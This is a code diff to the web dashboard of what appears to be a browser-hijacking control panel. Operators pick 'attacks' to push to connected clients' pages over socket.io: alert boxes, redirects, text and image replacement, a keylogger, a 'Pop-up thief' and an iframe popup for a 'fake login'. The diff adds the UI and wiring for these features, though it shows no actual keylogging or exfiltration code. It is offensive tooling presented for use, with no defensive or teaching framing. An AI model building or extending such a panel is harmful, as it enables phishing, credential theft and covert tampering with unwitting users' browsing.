@@ -68,6 +68,19 @@
         transition: transform 0.5s;
       }
 
+      .attack{
+        display: none;
+      }
+
+      .active{
+        background-color: white;
+      }
+
+      .attack:hover{
+        cursor: pointer;
+        cursor: hand;
+      }
+
       .client figure{
         backface-visibility: hidden;
       }
@@ -211,8 +224,117 @@
         margin-left: -15px;
       }
 
-      .attack{
+      #holder.hover {
+       border: 10px dashed #0c0 !important;
+      }
+
+      #inputfile {
+        width: 0.1px;
+        height: 0.1px;
+        opacity: 0;
+        overflow: hidden;
+        position: absolute;
+        z-index: -1;
+      }
+
+      .uploader{
+          font-family: "Source Sans Pro";
+          font-size: 17px;
+          text-align: center;
+          color: rgb(57, 57, 57);
+          position: relative;
+          left: 50%;
+          border-radius: 5px;
+          width: 290px;
+          padding: 10px;
+          background: rgb(203, 203, 203) none repeat scroll 0% 0%;
+          transform: translate(-50%);
+          margin-top: 15px;
+          margin-bottom: 30px;
+      }
+
+      #popup{
+        color: white;
+        font-family: 'Source Sans Pro', sans-serif;
+        height: 30px;
+        width: 120px;
+        border-radius: 5px;
+        background-color: #358CCF;
+        text-align: center;
+        position: absolute;
+        padding-top: 10px;
+        bottom: 0px;
+        left: 50%;
+        transform: translate(-50%,180%);
+        top: 50%;
+      }
+
+      input[type="text"]{
+        border: none;
+        display: block;
+        margin-bottom: 20px;
+        height: 30px;
+        width: 300px;
+        padding: 5px;
+        border-radius: 5px;
+        font-family: "Source Sans Pro";
+        background-color: #e9e9e9;
+        margin-left: 50%;
+        transform: translate(-50%);
+      }
+
+      button{
+        border: none;
+        display: block;
+        margin-bottom: 20px;
+        height: 40px;
+        width: 310px;
+        padding: 5px;
+        border-radius: 5px;
+        font-family: "Source Sans Pro";
+        background: #358CCF;
+        color: #e9e9e9;
+        font-size: 18px;
+        margin-left: 50%;
+        transform: translate(-50%);
+      }
+
+      #imrpl{
+        border: none;
+        display: block;
+        margin-bottom: 20px;
+        height: 40px;
+        width: 210px;
+        padding: 5px;
+        border-radius: 5px;
+        font-family: "Source Sans Pro";
+        background: #358CCF;
+        color: #e9e9e9;
+        font-size: 18px;
+        margin-left: 50%;
+        transform: translate(-50%);
+        margin-top: 40px;
+      }
+
+      button:hover{
+        cursor: pointer;
+        cursor: hand;
+      }
+
+      .content{
         display: none;
+        position: absolute;
+        left:50%;
+        top:50%;
+        transform: translate(-50%,-50%);
+      }
+
+      #description{
+        font-family: "Source Sans Pro";
+        color: white;
+        padding-bottom: 15px;
+        margin-bottom: 20px;
+        border-bottom: 1px solid #393939;
       }
 
     </style>
@@ -232,35 +354,35 @@
     <div id="container">
       <div id="attacks">
       <div id="empty">SERVICES ARE NOT AVAILABLE<br><i class="fa fa-info-circle" aria-hidden="true"></i> </div>
-        <div class="attack">
+        <div class="attack" id="alert-attack" onclick="displayAttackOptions(event,'displayPopup')">
             <div id="status">
-              <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></i></div>
+              <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></div>
               <div id="attackTitle">Toggle alert box</div>
               <div id="attackDescription">Displays an alert box on the client's webppage</div>
             </div>
         </div>
-        <div class="attack">
+        <div class="attack" id="redirect-attack" onclick="displayAttackOptions(event,'replaceText')">
             <div id="status">
               <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></div>
               <div id="attackTitle">Redirect</div>
               <div id="attackDescription">Redirects the client to a specific page</div>
             </div>
         </div>
-        <div class="attack">
+        <div class="attack" id="alert-attack" onclick="displayAttackOptions(event,'replaceImages')">
             <div id="status">
               <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></div>
               <div id="attackTitle">Replace Text</div>
               <div id="attackDescription">Replaces text on the client's webpage</div>
             </div>
         </div>
-        <div class="attack">
+        <div class="attack" id="alert-attack">
             <div id="status">
               <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></div>
               <div id="attackTitle">Keylogger</div>
               <div id="attackDescription">Get client's keyboard input</div>
             </div>
         </div>
-        <div class="attack">
+        <div class="attack" id="alert-attack">
             <div id="status">
               <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></div>
               <div id="attackTitle">Pop-up thief</div>
@@ -279,7 +401,40 @@
 
     <div id="container">
       <div id="services">
-        <div id="empty">NO SERVICE SELECTED<br><i class="fa fa-bomb" aria-hidden="true"></i></div>
+      <form name="myform" method="post" style="display:none;">
+         <input type="file" name="myfile" id="inputfile"/>
+         <div class="uploader" onclick="openExplorer()">Upload File  <i class="fa fa-upload" aria-hidden="true"></i>
+         </div>
+      </form>
+      <div class="content" id="replaceText">
+        <div id="description">Replace text displayed on the client's webpage with your own string. </div>
+        <input id="org" name="org" type="text" placeholder="String to replace" />
+        <input id="rpl" name="rpl" type="text" placeholder="Replacement string"/>
+        <button onclick="replaceText(document.getElementById('org').value,document.getElementById('rpl').value)">Replace text</button>
+      </div>
+      <div class="content"  id="replaceImages">
+        <div id="description">Replace every images displayed on the client's webpage with the one of your choice. </div>
+        <input id="imgurl" name="imgurl" type="text" placeholder="image url" />
+        <div style="text-align:center;font-family:'Source Sans Pro';color:gray;">OR</div>
+        <form name="myform" method="post" style="">
+           <input type="file" name="myfile" id="inputfile"/>
+           <div class="uploader" onclick="openExplorer()">Upload File  <i class="fa fa-upload" aria-hidden="true"></i>
+           </div>
+        </form>
+        <button id="imrpl" onclick="replaceImages(document.getElementById('imgurl').value)">Replace images</button>
+      </div>
+      <div class="content" id="displayPopup">
+        <div id="description">Displays an html iframe as a popup on the client's webpage (eg. fake login).</div>
+        <input id="popupurl" name="popupurl" type="text" placeholder="popup url" />
+        <div style="text-align:center;font-family:'Source Sans Pro';color:gray;">OR</div>
+        <form name="myform" method="post" style="">
+           <input type="file" name="myfile" id="inputfile"/>
+           <div class="uploader" onclick="openExplorer()">Upload File  <i class="fa fa-upload" aria-hidden="true"></i>
+           </div>
+        </form>
+        <button id="imrpl" onclick="replaceImages(document.getElementById('popupurl').value)">Replace images</button>
+      </div>
+        <!--div id="empty">NO SERVICE SELECTED<br><i class="fa fa-bomb" aria-hidden="true"></i></div-->
       </div>
     </div>
   </div>
@@ -293,6 +448,46 @@
 <script src="/socket.io/socket.io.js"></script>
 <script>
 
+
+function displayAttackOptions(evt, attackName) {
+    var i, attack, tablinks;
+    attack = document.getElementsByClassName("content");
+    for (i = 0; i < attack.length; i++) {
+        attack[i].style.display = "none";
+    }
+    tablinks = document.getElementsByClassName("attack");
+    for (i = 0; i < tablinks.length; i++) {
+        tablinks[i].className = tablinks[i].className.replace(" active", "");
+    }
+    document.getElementById(attackName).style.display = "block";
+    evt.currentTarget.className += " active";
+}
+
+  function openExplorer(){
+    document.getElementById("inputfile").click();
+  }
+
+  document.forms['myform'].elements['myfile'].onchange = function(evt) {
+      if(!window.FileReader) return; // Browser is not compatible
+
+      var reader = new FileReader();
+
+      reader.onload = function(evt) {
+          if(evt.target.readyState != 2) return;
+          if(evt.target.error) {
+              alert('Error while reading file');
+              return;
+          }
+
+          filecontent = evt.target.result;
+
+          socket.emit('temp_file',{'fileString':filecontent});
+      };
+
+      reader.readAsText(evt.target.files[0]);
+      $('#services').html('<iframe id="terminal" src="/temp/temp.html"></iframe>');
+  };
+
   var socket = io();
 
   socket.on('display_client', function(data){
@@ -303,7 +498,6 @@
       $("#attacks").mCustomScrollbar({
         theme:"light-thin"
       });
-      replaceText("sur","test");
   });
 
   socket.on('hide_client', function(data){
@@ -349,7 +543,7 @@
     }
 
     $("#clients").mCustomScrollbar({
-        theme:"light-thin"
+      theme:"light-thin"
     });
 
   });
@@ -361,6 +555,7 @@
 
   function replaceText(original,replacement){
     socket.emit('uiReplaceText',{'org':original,'rpl':replacement});
+    alert("done !");
   }
 
   function displayPopup(url){
